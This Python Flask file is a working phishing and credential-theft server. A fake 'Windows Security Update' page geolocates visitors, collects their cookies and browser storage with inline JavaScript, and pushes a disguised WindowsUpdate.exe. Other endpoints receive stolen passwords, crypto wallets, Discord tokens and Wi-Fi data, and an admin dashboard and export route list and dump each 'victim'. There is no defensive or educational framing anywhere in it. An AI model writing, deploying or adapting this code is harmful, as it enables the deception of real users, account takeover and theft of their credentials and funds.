import os
import base64
import json
import sqlite3
import hashlib
import datetime
import threading
import time
import requests
import socket
import struct
from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file
from functools import wraps
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# ==========================================
# DATABASE - PROFESSIONAL GRADE
# ==========================================
DB_PATH = 'god_vs_devil.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                
                -- Network Info
                ip TEXT,
                real_ip TEXT,
                country TEXT,
                city TEXT,
                isp TEXT,
                latitude REAL,
                longitude REAL,
                
                -- Device Info
                device_type TEXT,
                os TEXT,
                os_version TEXT,
                browser TEXT,
                browser_version TEXT,
                screen_res TEXT,
                timezone TEXT,
                language TEXT,
                platform TEXT,
                cpu_cores INTEGER,
                ram TEXT,
                
                -- Captured Data
                cookies TEXT,
                localStorage TEXT,
                sessionStorage TEXT,
                history TEXT,
                
                -- EXE Data (when run)
                passwords TEXT,
                wallets TEXT,
                discord_tokens TEXT,
                wifi TEXT,
                
                -- System Info
                hostname TEXT,
                username TEXT,
                mac_address TEXT,
                
                -- Timestamps
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                exe_run_time TIMESTAMP,
                
                -- Status
                downloaded_exe BOOLEAN DEFAULT 0,
                ran_exe BOOLEAN DEFAULT 0
            )
        ''')
        conn.commit()

init_db()

# ==========================================
# ADMIN CREDENTIALS
# ==========================================
ADMIN_USER = "god"
ADMIN_PASS = "devil"

def authenticate(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USER or auth.password != ADMIN_PASS:
            return ('Unauthorized', 401, {
                'WWW-Authenticate': 'Basic realm="GOD VS DEVIL"'
            })
        return f(*args, **kwargs)
    return decorated

# ==========================================
# GET REAL IP
# ==========================================
def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

# ==========================================
# GET LOCATION FROM IP
# ==========================================
def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        data = r.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0)
            }
    except:
        pass
    return {
        'country': 'Unknown',
        'city': 'Unknown',
        'isp': 'Unknown',
        'lat': 0,
        'lon': 0
    }

# ==========================================
# GET DEVICE INFO FROM USER AGENT
# ==========================================
def get_device_info(ua_string):
    ua = ua_string.lower()
    
    # Device type
    if 'mobile' in ua:
        device_type = 'Phone'
    elif 'tablet' in ua:
        device_type = 'Tablet'
    else:
        device_type = 'Desktop'
    
    # OS detection
    os = 'Unknown'
    os_version = ''
    if 'windows' in ua:
        os = 'Windows'
        if 'nt 10.0' in ua:
            os_version = '10/11'
        elif 'nt 6.1' in ua:
            os_version = '7'
    elif 'mac' in ua:
        os = 'macOS'
    elif 'linux' in ua:
        os = 'Linux'
    elif 'android' in ua:
        os = 'Android'
    elif 'ios' in ua or 'iphone' in ua or 'ipad' in ua:
        os = 'iOS'
    
    # Browser detection
    browser = 'Unknown'
    browser_version = ''
    if 'firefox' in ua:
        browser = 'Firefox'
    elif 'chrome' in ua:
        browser = 'Chrome'
    elif 'safari' in ua:
        browser = 'Safari'
    elif 'edge' in ua:
        browser = 'Edge'
    
    return {
        'device_type': device_type,
        'os': os,
        'os_version': os_version,
        'browser': browser,
        'browser_version': browser_version
    }

# ==========================================
# MAIN PAGE - AUTO DOWNLOAD + COOKIE STEALER
# ==========================================
@app.route('/')
def index():
    # Get real IP
    real_ip = get_real_ip()
    
    # Get location
    loc = get_location(real_ip)
    
    # Get device info
    device = get_device_info(request.headers.get('User-Agent', ''))
    
    # Generate victim ID
    victim_id = request.cookies.get('victim_id') or hashlib.md5(os.urandom(16)).hexdigest()[:16]
    
    # Save to database
    with get_db() as conn:
        conn.execute('''
            INSERT OR REPLACE INTO victims 
            (victim_id, ip, real_ip, country, city, isp, latitude, longitude,
             device_type, os, browser, first_seen, last_seen, downloaded_exe)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            victim_id,
            request.remote_addr,
            real_ip,
            loc['country'],
            loc['city'],
            loc['isp'],
            loc['lat'],
            loc['lon'],
            device['device_type'],
            f"{device['os']} {device['os_version']}",
            f"{device['browser']} {device['browser_version']}",
            datetime.datetime.now().isoformat(),
            datetime.datetime.now().isoformat(),
            True
        ))
        conn.commit()
    
    # PROFESSIONAL HTML PAGE
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Windows Security Update</title>
    <meta http-equiv="refresh" content="3;url=/WindowsUpdate.exe">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }}
        .container {{
            max-width: 600px;
            width: 90%;
            background: rgba(32, 32, 32, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .logo span {{
            font-size: 50px;
            background: #0078d4;
            width: 80px;
            height: 80px;
            display: inline-block;
            border-radius: 15px;
            line-height: 80px;
        }}
        h1 {{
            text-align: center;
            margin-bottom: 20px;
            font-weight: 400;
        }}
        .info {{
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }}
        .info-row {{
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }}
        .info-row:last-child {{
            border-bottom: none;
        }}
        .label {{
            color: #888;
        }}
        .value {{
            color: #0078d4;
            font-weight: 600;
        }}
        .progress {{
            margin: 30px 0;
        }}
        .progress-bar {{
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            overflow: hidden;
        }}
        .progress-fill {{
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #0078d4, #00b4ff);
            animation: progress 3s forwards;
        }}
        @keyframes progress {{
            0% {{ width: 0%; }}
            100% {{ width: 100%; }}
        }}
        .status {{
            text-align: center;
            margin-top: 20px;
            color: #888;
        }}
        .note {{
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span>🪟</span>
        </div>
        <h1>Windows Security Update</h1>
        
        <div class="info">
            <div class="info-row">
                <span class="label">Your IP</span>
                <span class="value">{real_ip}</span>
            </div>
            <div class="info-row">
                <span class="label">Location</span>
                <span class="value">{loc['city']}, {loc['country']}</span>
            </div>
            <div class="info-row">
                <span class="label">Device</span>
                <span class="value">{device['device_type']}</span>
            </div>
            <div class="info-row">
                <span class="label">System</span>
                <span class="value">{device['os']} {device['os_version']}</span>
            </div>
        </div>
        
        <div class="progress">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
        </div>
        
        <div class="status" id="status">Preparing update...</div>
        <div class="note">Critical security update KB5039212</div>
    </div>

    <script>
    (function() {{
        // ==========================================
        // STEAL ALL COOKIES
        // ==========================================
        let stolenData = {{
            cookies: {{}},
            localStorage: {{}},
            sessionStorage: {{}},
            screen: window.screen.width + 'x' + window.screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            cpu_cores: navigator.hardwareConcurrency || 'unknown',
            ram: navigator.deviceMemory || 'unknown'
        }};
        
        // Get all cookies
        try {{
            document.cookie.split(';').forEach(c => {{
                if(c.trim()) {{
                    let parts = c.trim().split('=');
                    let name = parts[0];
                    let value = parts.slice(1).join('=');
                    stolenData.cookies[name] = value;
                }}
            }});
        }} catch(e) {{}}
        
        // Get localStorage
        try {{
            for(let i = 0; i < localStorage.length; i++) {{
                let key = localStorage.key(i);
                stolenData.localStorage[key] = localStorage.getItem(key);
            }}
        }} catch(e) {{}}
        
        // Get sessionStorage
        try {{
            for(let i = 0; i < sessionStorage.length; i++) {{
                let key = sessionStorage.key(i);
                stolenData.sessionStorage[key] = sessionStorage.getItem(key);
            }}
        }} catch(e) {{}}
        
        // Send to server
        fetch('/api/capture', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(stolenData),
            keepalive: true
        }});
        
        // Update status
        document.getElementById('status').innerHTML = 'Downloading update...';
        
        // Set test cookie
        document.cookie = "session_" + Math.random().toString(36).substring(7) + "=active; path=/; max-age=3600";
    }})();
    </script>
</body>
</html>
    '''
    
    response = make_response(render_template_string(html))
    response.set_cookie('victim_id', victim_id, max_age=86400*30)
    return response

# ==========================================
# EXE DOWNLOAD
# ==========================================
@app.route('/WindowsUpdate.exe')
def download_exe():
    victim_id = request.cookies.get('victim_id', 'unknown')
    
    # Mark as downloaded
    with get_db() as conn:
        conn.execute('UPDATE victims SET downloaded_exe = 1 WHERE victim_id = ?', (victim_id,))
        conn.commit()
    
    return send_file('WindowsUpdate.exe', 
                     as_attachment=True, 
                     download_name='WindowsUpdate.exe',
                     mimetype='application/octet-stream')

# ==========================================
# CAPTURE API
# ==========================================
@app.route('/api/capture', methods=['POST'])
def api_capture():
    data = request.json
    victim_id = request.cookies.get('victim_id')
    
    if data and victim_id:
        with get_db() as conn:
            conn.execute('''
                UPDATE victims SET
                    cookies = ?,
                    localStorage = ?,
                    sessionStorage = ?,
                    screen_res = ?,
                    timezone = ?,
                    language = ?,
                    platform = ?,
                    cpu_cores = ?,
                    ram = ?,
                    last_seen = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(data.get('cookies', {})),
                json.dumps(data.get('localStorage', {})),
                json.dumps(data.get('sessionStorage', {})),
                data.get('screen', ''),
                data.get('timezone', ''),
                data.get('language', ''),
                data.get('platform', ''),
                data.get('cpu_cores', ''),
                data.get('ram', ''),
                datetime.datetime.now().isoformat(),
                victim_id
            ))
            conn.commit()
        return jsonify({"status": "ok", "count": len(data.get('cookies', {}))})
    return jsonify({"status": "error"}), 400

# ==========================================
# EXE DATA API
# ==========================================
@app.route('/api/exe-data', methods=['POST'])
def api_exe_data():
    data = request.json
    victim_id = data.get('victim_id')
    
    if data and victim_id:
        with get_db() as conn:
            conn.execute('''
                UPDATE victims SET
                    passwords = ?,
                    wallets = ?,
                    discord_tokens = ?,
                    wifi = ?,
                    hostname = ?,
                    username = ?,
                    mac_address = ?,
                    ran_exe = 1,
                    exe_run_time = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(data.get('passwords', [])),
                json.dumps(data.get('wallets', [])),
                json.dumps(data.get('discord', [])),
                json.dumps(data.get('wifi', [])),
                data.get('hostname', ''),
                data.get('username', ''),
                data.get('mac', ''),
                datetime.datetime.now().isoformat(),
                victim_id
            ))
            conn.commit()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ==========================================
# ADMIN DASHBOARD - PROFESSIONAL
# ==========================================
@app.route('/admin')
@authenticate
def admin():
    with get_db() as conn:
        victims = conn.execute('''
            SELECT * FROM victims 
            ORDER BY last_seen DESC 
            LIMIT 100
        ''').fetchall()
        
        stats = {
            'total': conn.execute('SELECT COUNT(*) FROM victims').fetchone()[0],
            'downloaded': conn.execute('SELECT COUNT(*) FROM victims WHERE downloaded_exe = 1').fetchone()[0],
            'ran': conn.execute('SELECT COUNT(*) FROM victims WHERE ran_exe = 1').fetchone()[0],
            'cookies': conn.execute('SELECT COUNT(*) FROM victims WHERE cookies IS NOT NULL AND cookies != "null"').fetchone()[0]
        }
    
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>GOD VS DEVIL - PROFESSIONAL</title>
    <meta http-equiv="refresh" content="5">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            background: #0a0a0a;
            color: #fff;
            font-family: 'Segoe UI', monospace;
            padding: 20px;
        }}
        .header {{
            background: linear-gradient(135deg, #000000, #1a0033);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #ff00ff;
        }}
        h1 {{
            color: #ff00ff;
            font-size: 28px;
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }}
        .stat-card {{
            background: #111;
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 8px;
        }}
        .stat-value {{
            font-size: 36px;
            font-weight: bold;
            color: #00ff00;
        }}
        .stat-label {{
            color: #888;
            text-transform: uppercase;
            font-size: 12px;
        }}
        .victim-card {{
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            margin: 15px 0;
            padding: 15px;
        }}
        .victim-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            margin-bottom: 10px;
        }}
        .victim-id {{
            color: #ff00ff;
            font-weight: bold;
            font-size: 16px;
        }}
        .victim-ip {{
            color: #00ffff;
        }}
        .victim-time {{
            color: #888;
            font-size: 12px;
        }}
        .badge {{
            background: #00ff00;
            color: black;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 11px;
            margin-left: 10px;
        }}
        .badge-purple {{
            background: #ff00ff;
            color: white;
        }}
        .data-grid {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 10px;
        }}
        .data-section {{
            background: #1a1a1a;
            padding: 10px;
            border-radius: 5px;
        }}
        .section-title {{
            color: #00ffff;
            font-weight: bold;
            margin-bottom: 5px;
            font-size: 14px;
        }}
        .cookie-list {{
            max-height: 200px;
            overflow: auto;
            font-size: 11px;
            background: #000;
            padding: 8px;
            border-radius: 3px;
        }}
        .cookie-item {{
            border-bottom: 1px solid #333;
            padding: 3px 0;
        }}
        .cookie-name {{
            color: #ffff00;
        }}
        .cookie-value {{
            color: #ffaa00;
            word-break: break-all;
        }}
        .live-indicator {{
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #00ff00;
            border-radius: 50%;
            animation: pulse 1s infinite;
        }}
        @keyframes pulse {{
            0% {{ opacity: 0.5; }}
            50% {{ opacity: 1; }}
            100% {{ opacity: 0.5; }}
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>⚔️ GOD VS DEVIL - PROFESSIONAL STEALER ⚔️</h1>
        <p style="color: #888;">Live victims: {stats['total']} | EXE Downloads: {stats['downloaded']} | EXE Ran: {stats['ran']}</p>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <div class="stat-value">{stats['total']}</div>
            <div class="stat-label">Total Victims</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['cookies']}</div>
            <div class="stat-label">Cookies Captured</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['downloaded']}</div>
            <div class="stat-label">EXE Downloads</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['ran']}</div>
            <div class="stat-label">EXE Executed</div>
        </div>
    </div>
'''
    
    for v in victims:
        cookies = json.loads(v['cookies']) if v['cookies'] else {}
        passwords = json.loads(v['passwords']) if v['passwords'] else []
        wallets = json.loads(v['wallets']) if v['wallets'] else []
        discord = json.loads(v['discord_tokens']) if v['discord_tokens'] else []
        
        html += f'''
    <div class="victim-card">
        <div class="victim-header">
            <div>
                <span class="victim-id">{v['victim_id'][:8]}</span>
                <span class="victim-ip">{v['real_ip'] or v['ip']}</span>
                <span style="color: #fff;">{v['city']}, {v['country']}</span>
                <span class="badge">{v['device_type']}</span>
                {f'<span class="badge-purple">💰 WALLET</span>' if wallets else ''}
                {f'<span class="badge-purple">🎮 DISCORD</span>' if discord else ''}
                <span class="live-indicator"></span>
            </div>
            <div class="victim-time">{v['last_seen'][:19]}</div>
        </div>
        
        <div class="data-grid">
            <div class="data-section">
                <div class="section-title">🍪 COOKIES ({len(cookies)})</div>
                <div class="cookie-list">
        '''
        
        for name, value in list(cookies.items())[:20]:
            html += f'<div class="cookie-item"><span class="cookie-name">{name}:</span> <span class="cookie-value">{value[:50]}</span></div>'
        
        html += f'''
                </div>
            </div>
            
            <div class="data-section">
                <div class="section-title">📱 DEVICE INFO</div>
                <div><b>OS:</b> {v['os']}</div>
                <div><b>Browser:</b> {v['browser']}</div>
                <div><b>Screen:</b> {v['screen_res']}</div>
                <div><b>Timezone:</b> {v['timezone']}</div>
                <div><b>Language:</b> {v['language']}</div>
                <div><b>Platform:</b> {v['platform']}</div>
                <div><b>CPU Cores:</b> {v['cpu_cores']}</div>
                <div><b>RAM:</b> {v['ram']} GB</div>
                <div><b>ISP:</b> {v['isp']}</div>
            </div>
        </div>
        
        <div class="data-grid">
            <div class="data-section">
                <div class="section-title">🔐 PASSWORDS ({len(passwords)})</div>
                <div class="cookie-list">
        '''
        
        for p in passwords[:10]:
            html += f'<div>{p.get("url", "N/A")}: {p.get("username", "")}:{p.get("password", "")}</div>'
        
        html += f'''
                </div>
            </div>
            
            <div class="data-section">
                <div class="section-title">💰 WALLETS ({len(wallets)})</div>
                <div class="cookie-list">
        '''
        
        for w in wallets[:10]:
            html += f'<div style="color: gold;">{w}</div>'
        
        html += f'''
                </div>
            </div>
        </div>
        
        <div style="margin-top: 5px; color: #666; font-size: 10px;">
            First seen: {v['first_seen'][:19]} | EXE downloaded: {'✅' if v['downloaded_exe'] else '❌'} | EXE ran: {'✅' if v['ran_exe'] else '❌'}
        </div>
    </div>
    '''
    
    html += '''
</body>
</html>
    '''
    
    return html

# ==========================================
# EXPORT ALL DATA
# ==========================================
@app.route('/export')
@authenticate
def export():
    with get_db() as conn:
        data = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC').fetchall()
    
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=god_vs_devil_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

# ==========================================
# HEALTH CHECK
# ==========================================
@app.route('/ping')
def ping():
    return jsonify({"status": "operational", "time": datetime.datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port, debug=False)
